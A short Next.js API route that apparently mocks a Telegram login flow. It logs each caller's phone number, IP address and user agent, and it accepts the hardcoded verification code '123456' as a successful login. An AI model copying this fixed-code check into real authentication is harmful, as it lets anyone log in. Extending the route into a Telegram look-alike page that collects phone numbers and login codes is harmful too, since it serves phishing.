import { NextResponse } from "next/server"

export async function POST(request) {
  try {
    const body = await request.json()
    const { phoneNumber, verificationCode, step, platform } = body

    console.log("Telegram Login Attempt:", {
      phoneNumber,
      verificationCode: verificationCode ? "***hidden***" : undefined,
      step,
      platform,
      timestamp: new Date().toISOString(),
      userAgent: request.headers.get("user-agent"),
      ip: request.headers.get("x-forwarded-for") || request.headers.get("x-real-ip"),
    })

    await new Promise((resolve) => setTimeout(resolve, 1000))

    if (step === "phone") {
      // Simulate sending verification code
      return NextResponse.json({
        success: true,
        message: "Verification code sent successfully",
      })
    }

    if (step === "verify") {
      // Simulate verification
      if (verificationCode === "123456") {
        return NextResponse.json({
          success: true,
          message: "Login successful",
          user: {
            phoneNumber,
            platform,
          },
        })
      }

      return NextResponse.json(
        {
          success: false,
          message: "Invalid verification code",
        },
        { status: 401 },
      )
    }

    return NextResponse.json(
      {
        success: false,
        message: "Invalid request",
      },
      { status: 400 },
    )
  } catch (error) {
    console.error("Telegram API Error:", error)
    return NextResponse.json(
      {
        success: false,
        message: "Internal server error",
      },
      { status: 500 },
    )
  }
}
